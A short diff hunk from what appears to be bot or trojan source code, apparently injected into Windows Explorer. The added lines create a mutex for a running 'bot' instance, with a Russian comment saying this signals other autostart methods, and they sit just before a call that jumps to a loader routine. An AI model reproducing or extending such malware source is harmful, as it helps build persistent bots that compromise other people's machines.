@@ -186,6 +186,11 @@ void ExplorerMain()
 
 	//----------------------------------------------------
 
+	// Создаем мьютекс запущенного бота для сигнализации другим 
+	// способам автозапуска.
+	BOT::TryCreateBotInstance();
+
+
 	if ( !dwAlreadyRun )
 		MegaJump( LoaderRoutine );
 	
